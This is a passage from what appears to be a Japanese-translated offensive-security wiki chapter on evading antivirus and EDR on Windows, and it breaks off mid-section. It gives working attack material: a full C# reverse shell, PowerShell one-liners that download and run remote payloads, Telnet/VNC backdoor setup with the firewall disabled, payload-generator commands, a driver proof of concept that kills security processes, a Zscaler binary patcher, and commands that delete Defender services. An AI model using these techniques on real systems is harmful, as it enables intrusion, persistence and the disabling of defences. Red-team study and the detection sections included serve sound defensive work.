o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
SmartScreen を bypass するために、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使用して ISO ファイル内に payloads をパッケージ化するデモです

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows の強力な logging メカニズムであり、applications や system components が **events を log** できるようにします。ただし、security products が悪意のある activities を monitor および detect するために使用することもできます。

AMSI を disabled (bypassed) にするのと同様に、user space process の **`EtwEventWrite`** function を、events を log せずに即座に return させることも可能です。これは、memory 内の function を patch して即座に return させることで実現し、その process における ETW logging を実質的に無効化します。

詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup> を参照してください。


## C# Assembly Reflection

C# binaries を memory 内に load する手法はかなり以前から知られており、AV に捕捉されずに post-exploitation tools を実行する非常に優れた方法です。

payload は disk に触れることなく直接 memory に load されるため、process 全体に対する AMSI の patch だけを考慮すれば済みます。

ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc など) は、C# assemblies を直接 memory 内で execute する機能をすでに提供していますが、その方法にはいくつかの種類があります。

- **Fork\&Run**

これは、**新しい sacrificial process を spawn** し、その新しい process に post-exploitation の malicious code を inject して実行し、完了後に新しい process を kill する方法です。この方法にはメリットとデメリットの両方があります。fork and run method のメリットは、execution が **Beacon implant process の外部** で行われることです。つまり、post-exploitation action で問題が発生したり、捕捉されたりしても、**implant が生き残る可能性がはるかに高くなります。** デメリットは、**Behavioural Detections** によって捕捉される **可能性が高くなる** ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitation の malicious code を **自身の process に inject** する方法です。これにより、新しい process を作成して AV に scan されるのを避けられますが、デメリットとして、payload の execution で問題が発生した場合、crash する可能性があるため、**beacon を失う** **可能性がはるかに高くなります。**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading についてさらに読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

C# Assemblies は **PowerShell から** load することもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Other Programming Languages の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、**Attacker Controlled SMB share にインストールされた interpreter environment** への access を compromised machine に与えることで、他の languages を使用して malicious code を execute できます。

SMB share 上の Interpreter Binaries と environment への access を許可することで、compromised machine の **memory 内でこれらの languages の arbitrary code を execute** できます。

repo によると、Defender は scripts を引き続き scan しますが、Go、Java、PHP などを活用することで、**static signatures を bypass する柔軟性が高まります**。これらの languages で random な un-obfuscated reverse shell scripts を使用した testing は成功しています。

## TokenStomping

Token stomping は、EDR や AV などの security product の access token を manipulate します。token の privileges を減らすことで、process を実行したまま、privileged inspection や remediation actions を実行できない状態にできます。

これを防ぐために、Windows は **external processes が security processes の tokens に対する handles を取得することを** 防止できます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software の使用

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victim の PC に Chrome Remote Desktop を deploy し、それを使用して takeover し、persistence を維持するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ から download し、"Set up via SSH" をクリックしてから、Windows 用の MSI file をクリックして MSI file を download します。
2. victim 上で installer を silently 実行します (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page に戻り、next をクリックします。wizard から authorize を求められるので、Authorize button をクリックして続行します。
4. 必要な調整を加えて、提供された command を execute します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter は GUI を使用せずに PIN を設定します)。


## Advanced Evasion

Evasion は非常に複雑な topic です。成熟した environments では、1 つの system 内にあるさまざまな telemetry sources を考慮する必要がある場合があるため、完全に undetected の状態を維持することはほぼ不可能です。

対峙するすべての environment には、それぞれ独自の strengths と weaknesses があります。

より Advanced Evasion techniques の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94) によるこの talk をぜひご覧になることを強くおすすめします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his は、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth についての、もう 1 つの素晴らしい talk です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender が malicious と判断する parts を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、**Defender が malicious と判断している parts を特定するまで binary の parts を** **削除し、その parts を分離して表示** できます。\
同じことを行う別の tool が [**avred**](https://github.com/dobin/avred) で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) では web 上でこの service を提供しています。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が付属しており、次の command を実行することで (administrator として) install できました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムの起動時に**起動**するようにし、今すぐ**実行**します。
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portを変更**（stealth）して firewallを無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

以下からダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく、bin downloads が必要です）

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します。

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を**victim**内に移動します。

#### **Reverse connection**

**attacker** は自身の**ホスト内で**バイナリ `vncviewer.exe -listen 5900` を**実行**し、reverse **VNC connection** を受け取れる状態にします。次に、**victim**内で winvnc daemon `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します。

**WARNING:** stealth を維持するには、いくつかの操作を行ってはいけません。

- `winvnc` がすでに実行中の場合は起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認します。
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。[the config window](https://i.imgur.com/rfMQWcf.png) が開きます。
- ヘルプを表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます。

### GreatSCT

以下からダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT の内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で**リスナーを起動**し、以下で **xml payload** を**実行**します。
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のDefenderはプロセスを非常に速く終了させます。**

### 独自のreverse shellのコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# reverse shell

次のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下と一緒に使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler の使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscatorsの一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorをbuildするためのPythonの使用例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のtools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) - Kernel SpaceからAV/EDRを停止する

Storm-2603は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator** と呼ばれる小さなコンソールユーティリティを使用しました。このツールは**独自の脆弱だが *signed* なドライバー**を持ち込み、それを悪用して、Protected-Process-Light（PPL）AVサービスでさえブロックできない特権付きのkernel操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **Signed driver**: ディスクに配布されるファイルは `ServiceMouse.sys` ですが、バイナリ自体はAntiy Labsの「System In-Depth Analysis Toolkit」に含まれる、正規に署名されたドライバー `AToolsKrnl64.sys` です。このドライバーには有効なMicrosoft署名が付いているため、Driver-Signature-Enforcement（DSE）が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行でドライバーを**kernel service**として登録し、2行目で起動することで、ユーザーランドから `\\.\ServiceMouse` にアクセスできるようになります。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PIDによって任意のプロセスを終了（Defender/EDRサービスの停止に使用） |
| `0x990000D0` | ディスク上の任意のファイルを削除 |
| `0x990001D0` | ドライバーをアンロードし、サービスを削除 |

最小限のC proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **なぜ機能するのか**: BYOVDはuser-modeの保護を完全に迂回します。kernelで実行されるコードは、PPL/PP、ELAM、その他のhardening機能に関係なく、*protected*プロセスを開いたり、終了したり、kernel objectを改変したりできます。

検出 / Mitigation
• Microsoftのvulnerable-driver block list（`HVCI`、`Smart App Control`）を有効にし、Windowsが `AToolsKrnl64.sys` をロードしないようにする。
• 新しい *kernel* serviceの作成を監視し、ドライバーがworld-writableなディレクトリからロードされた場合やallow-listに存在しない場合にalertを出す。
• user-modeからcustom device objectへのhandleが作成された後、疑わしい `DeviceIoControl` 呼び出しが行われていないか監視する。

### Zscaler Client ConnectorのOn-Disk Binary PatchingによるPosture ChecksのBypass

Zscalerの**Client Connector**はdevice-postureルールをローカルで適用し、Windows RPCを使用して結果を他のコンポーネントに伝達します。次の2つの設計上の弱点により、完全なbypassが可能です。

1. Posture evaluationが**完全にclient-side**で行われる（booleanがserverに送信される）。
2. Internal RPC endpointは、接続するexecutableが**Zscalerによってsignedされていること**（`WinVerifyTrust`経由）のみを検証します。<sup>[[11]](#references)</sup>

**4つのsigned binaryをディスク上でpatchする**ことで、両方の仕組みを無効化できます。

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのcheckがcompliantになる |
| `ZSAService.exe` | `WinVerifyTrust`への間接呼び出し | NOP化され、任意の（unsignedなものも含む）processがRPC pipeにbindできる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | tunnelのIntegrity checks | short-circuitされる |

最小限のpatcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **すべて**の posture checks が **green/compliant** と表示される。
* 署名されていない、または変更されたバイナリが、named-pipe RPC endpoints（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストが、Zscaler policies で定義された内部ネットワークへ無制限にアクセスできる。

この case study は、純粋に client-side で行われる trust decisions と単純な signature checks が、数バイトの patch で突破できることを示している。

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender の **Boot-Time Removal** driver は、従来の BYOVD に対する有用な counterexample である。`BTR.sys` は、memory-corruption bug も IOCTL interface も持たない、正規の Microsoft-signed remediation component である。administrator access と `SeLoadDriverPrivilege` を取得した operator は、代わりに private remediation transaction を偽造し、意図された Ring-0 の file/registry operations を実行できる。これは **initial access や privilege escalation ではなく、post-compromise AV/EDR-neutralization primitive** であり、目立つ third-party driver を持ち込むのではなく、対象自身の `MpEngine.dll` にある `BOOTTIMETOOL` resource から driver を抽出できる。<sup>[[36]](#references)</sup>

### one-shot driver の staging

Defender は通常、resource をランダムな `[a-z]{8}.sys` ファイルとして配置し、同様の名前を持つ kernel service を登録する。`DriverEntry` は service の `Args` value を読み取り、指定された NTFS ADS を開き、action list を復号して検証し、feedback を書き込む。その後、実行に成功すると `0xC0000056`（`STATUS_DELETE_PENDING`）を返すため、driver は常駐せず unload される。偽造された service には、次の特徴的な values がある。<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。分析対象のビルドでは固定された256バイトのキーが再利用されるため、暗号化は認可境界ではありません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、およびペイロードから導出されたトランザクションID）で始まり、その後にヌル終端されたUTF-16のフィードバックパスと、任意の数のアイテムが続きます。各アイテムには16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータが含まれ、**必ず4つのNULバイト**で終わります。すべてのヘッダー領域とデータ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRC stateは領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、以下のkernel primitivesが公開されています。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含むファイルを削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除 |
| 3 | `[Flags][source][destination]` | attackerが選択した保護パスへファイルを移動。空のdestinationの場合は削除 |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成または更新し、不足しているキーのパスを作成 |

アクション5および6では、wire上のキーと値の区切り文字は**連続する2つのバックスラッシュ**です。通常の形式で記述されたパスは正しく分割されません。フィードバックファイルは主にリクエストを反映しますが、各アイテムの最初の4データバイトは、結果の`NTSTATUS`になります。先頭にflagsフィールドを持たないアクション1および2では、BTRはそのstatus用の領域を確保するため、パスを4つの予約済み末尾バイトへ移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローとearly-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は完全なchainを実装します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成し、連結されたアクションをシリアライズ、チェックサム計算、暗号化した後、サービスのレジストリキーを直接作成し、`-trigger now`の場合は`NtLoadDriver`を呼び出し、`-trigger boot`の場合はsystem-start driverとして残します。直接レジストリにstagingすることで、通常のSCM `CreateServiceW`パスを回避するため、サービスインストールのEvent ID 7045は**生成されません**。boot-triggered artifactは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0`は使用できません。BTRは`DriverEntry`から、storage stackと`SystemRoot`リンクの準備が完了する前にfile I/Oを実行するためです。高優先度の`Boot Bus Extender`グループと`Start=1`を組み合わせると、代わりにPhase 1で実行されます。この時点ではNTFSは使用可能ですが、多くのsystem-start security driversとuser-mode EDR servicesはまだ初期化されていません。`WdFilter`などのboot-start filtersはすでにロードされている可能性がありますが、BTRは次回のstart前にそれらのbinariesまたはservice configurationを削除でき、SCMが起動する前にservice executablesを削除できます。BTRはboot-start evaluation後に実行され、有効なMicrosoft signatureを持つため、ELAMでもこのgapは解消されません。<sup>[[36]](#references)</sup>

複数のactionが1つのtransaction内で実行されます。PoCは、ハードコードされた`\SystemRoot\Temp\BootClean.log`に対するAction 1を先頭に追加します。BTRはこのlogを作成し、その後自身のdelete requestを処理してunload前に削除します。これによりevidenceが減少します。また、`<random>.sys:<random>.dat`にfeedbackを配置すると、driverと両方のstreamsをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

Signature-only rulesとMicrosoft vulnerable-driver blocklistでは、意図されたBTR functionalityのabuseに対処できません。任意のlauncherと正規のDefender lineageを区別しながら、以下のbehavioral correlationsを優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`の作成はBTR stagingに共通します。同じ`.sys`に付加された`.dat` ADSは特に疑わしいものです。正規のDefenderは通常、feedbackを`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`以下に配置するためです。
- **Sysmon 12/13 without System 7045:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>`を直接作成し、`Args=...:changelist`と`Group=Boot Bus Extender`を含むものについて、対応するSCM installation eventが存在しない場合にcorrelateします。
- **Sysmon 6 -> 23:** non-Defender lineageの既知のBTR driver loadと、その後に`System`/PID 4に帰属するfile deletionをcorrelateします。特にsecurity binariesを対象とする場合は注意が必要です。
- **Sysmon 11 -> 23:** `System`/PID 4による`\SystemRoot\Temp\BootClean.log`の迅速な作成と削除をalertします。
- `SeLoadDriverPrivilege`のassignment/enablingを制限・auditします。`cmd.exe`、PowerShell、またはunknown processによってsecurity-tool driverがstagingされている場合、Microsoft signatureだけではtrustとして不十分です。

## Protected Process Light (PPL)をAbusingしてLOLBINsでAV/EDRをTamperする

Protected Process Light (PPL)はsigner/level hierarchyを適用し、同等以上のprotected processだけが相互にtamperできるようにします。Offensivelyは、PPL-enabled binaryを正当にlaunchでき、そのargumentsを制御できる場合、benign functionality（例：logging）を、AV/EDRが使用するprotected directoriesに対する、制約付きのPPL-backed write primitiveへ変換できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

What makes a process run as PPL
- 対象のEXE（およびロードされるすべてのDLL）は、PPL-capable EKUで署名されている必要があります。
- Processは、以下のflagsを指定したCreateProcessで作成する必要があります：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- binaryのsignerと一致するcompatible protection levelをrequestする必要があります（例：anti-malware signersには`PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signersには`PROTECTION_LEVEL_WINDOWS`）。誤ったlevelsではcreationに失敗します。

PP/PPLとLSASS protectionのより広範なintroについては、こちらも参照してください：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper：CreateProcessAsPPL（protection levelを選択し、argumentsをtarget EXEにforwardします）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みの system binary `C:\Windows\System32\ClipUp.exe` は self-spawn し、呼び出し元が指定した path に log file を書き込む parameter を受け付けます。
- PPL process として起動すると、file write は PPL backing によって実行されます。
- ClipUp は spaces を含む path を parse できないため、通常は保護されている location を指定するには 8.3 short paths を使用します。

8.3 short path helpers
- short names を一覧表示するには、各 parent directory で `dir /x` を実行します。
- cmd で short path を導出するには、`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA` を使用します。

Abuse chain (abstract)
1) launcher（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` で PPL-capable LOLBIN（ClipUp）を起動します。
2) ClipUp の log-path argument を渡し、protected AV directory（例: Defender Platform）内に file creation を強制します。必要に応じて 8.3 short names を使用します。
3) 対象の binary が実行中に AV によって通常 open/locked されている場合（例: MsMpEng.exe）、AV の起動前の boot 時に write が実行されるよう、より早く確実に実行される auto-start service を install して write を schedule します。Process Monitor（boot logging）で boot ordering を検証します。
4) reboot すると、PPL-backed write が AV による binary の lock より前に実行され、対象 file が corrupt されて startup が阻止されます。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
メモと制約
- ClipUp が書き込む内容は配置場所を除いて制御できないため、この primitive は正確な内容の injection ではなく、corruption に適しています。
- service の install/start と reboot window には local admin/SYSTEM が必要です。
- Timing が重要です: target が open であってはなりません。boot-time execution により file lock を回避できます。

検出
- `ClipUp.exe` の unusual arguments を伴う process creation。特に、boot 前後に non-standard launcher が parent になっているもの。
- suspicious な binary を auto-start するよう設定された新しい service、および Defender/AV より一貫して先に start する service。Defender の startup failure より前に行われた service の creation/modification を調査します。
- Defender binary/Platform directory に対する file integrity monitoring。protected-process flag を持つ process による予期しない file creation/modification。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された process、および non-AV binary による anomalous な PPL level の使用を探します。

緩和策
- WDAC/Code Integrity: PPL として実行できる signed binary と、その parent を制限します。legitimate な context 以外での ClipUp invocation を block します。
- Service hygiene: auto-start service の creation/modification を制限し、start-order manipulation を monitor します。
- Defender tamper protection と early-launch protection が有効であることを確認します。binary corruption を示す startup error を調査します。
- 環境との互換性がある場合は、security tooling をホストする volume で 8.3 short-name generation を無効化することを検討します（十分に test してください）。

## Platform Version Folder Symlink Hijack による Microsoft Defender の Tampering

Windows Defender は、以下の下にある subfolder を列挙して、実行する platform を選択します:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

